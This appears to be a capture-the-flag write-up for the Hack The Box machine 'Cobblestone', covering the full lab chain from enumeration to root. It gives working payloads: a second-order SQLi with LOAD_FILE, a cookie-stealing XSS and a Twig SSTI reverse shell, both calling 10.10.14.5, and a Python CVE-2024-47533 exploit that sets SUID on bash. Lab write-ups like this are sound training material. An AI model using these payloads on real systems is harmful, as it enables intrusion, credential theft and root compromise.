---
title: "Cobblestone"
difficulty: Insane
os: Linux
points: 50
rating: 3.3
date: 2025-08-09
avatar: assets/htb/cobblestone.png
tags: [second-order-sqli, load_file, xss, ssti, twig, hash-crack, cobbler, cve-2024-47533]
htb_url: https://app.hackthebox.com/machines/Cobblestone
---

## Summary

Cobblestone is a multi-stage web-to-root Insane chain on Debian 12. Subdomain fuzzing reveals two vhosts: `vote.cobblestone.htb`, which is vulnerable to second-order SQL injection, and `deploy.cobblestone.htb`, an admin panel with a Twig SSTI sink. I abuse the stored SQLi together with MySQL's `LOAD_FILE` to read server-side files such as the deploy panel's `.env`, use stored XSS to steal an admin session, then land code execution through Twig template injection on the deploy panel. From there I crack database hashes for an SSH foothold, and finally escalate to root by exploiting the Cobbler XMLRPC API (CVE-2024-47533) bound to `127.0.0.1:25151` and running as root.

## Enumeration

A full port scan with service and script detection shows the usual SSH plus HTTP/HTTPS.

```bash
nmap -p- --min-rate=10000 -sV -sC cobblestone.htb
# 22, 80, 443
```

Fuzzing virtual hosts against the `Host` header uncovers two additional subdomains, each a distinct attack surface.

```bash
ffuf -u http://FUZZ.cobblestone.htb -H "Host: FUZZ.cobblestone.htb" \
     -w subdomains.txt -mc 200,403
# -> vote.cobblestone.htb, deploy.cobblestone.htb
```

## Foothold

### Second-order SQLi and file read

The registration flow on `vote.cobblestone.htb` accepts a comment field. That stored value is later embedded into a SELECT on the admin moderation page, making this a second-order injection — the payload is stored on one request and executed on another, which is why off-the-shelf scanners tend to miss it.

```sql
SELECT * FROM comments WHERE author = '<stored input>'
```

I register with a comment that breaks out of the query and pulls a file off disk via `LOAD_FILE` (which requires the MySQL `FILE` privilege — present here):

```
x', (SELECT LOAD_FILE('/var/www/deploy/.env'))) -- -
```

The next time the admin page renders, the payload reads `/var/www/deploy/.env` and embeds the contents directly in the rendered HTML, leaking the deploy panel's secrets.

### Stored XSS for the admin cookie

A separate field on vote allows HTML through a regex bypass. I inject an SVG payload that exfiltrates the cookie to my host:

```html
<svg/onload=fetch('http://10.10.14.5/'+document.cookie)>
```

When the admin loads the moderation page, their cookie is sent to me, giving me an authenticated admin session on the deploy panel.

### Twig SSTI on the deploy panel

Authenticated as admin, the deploy panel renders a Twig template from a user-supplied "Deployment Description". The classic `registerUndefinedFilterCallback` primitive turns that into command execution and a reverse shell:

```
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'")}}
```

This lands a shell as `www-deploy`.

### Hash crack and SSH

The database dump exposes bcrypt hashes. Cracking them yields valid credentials for an SSH login, moving me to a stable shell on the host.

```bash
hashcat -m 3200 hashes.txt rockyou.txt
# user : <pw>
ssh user@cobblestone.htb
```

## Privilege Escalation

Enumerating listening services reveals `cobblerd` bound to localhost and running as root:

```bash
ss -ltnp | grep 25151
# 127.0.0.1:25151  cobblerd (root)
```

This is vulnerable to CVE-2024-47533: an `xmlrpc_methods` permission check is missing for `background_*` tasks, and in the default configuration a token can be forged via `login()` with empty credentials. I connect to the local XMLRPC endpoint, grab a token, and trigger `background_buildiso` with attacker-controlled args that invoke a shell to set the SUID bit on bash:

```python
import xmlrpc.client
c = xmlrpc.client.ServerProxy('http://127.0.0.1:25151')
token = c.login('', '')
# Trigger background_buildiso with attacker-controlled args that invoke shell
c.background_buildiso({'iso':'/tmp/p.iso','profiles':'$(chmod +s /bin/bash)'}, token)
```

Running `/bin/bash -p` then drops me into a uid 0 shell, completing the chain to root.
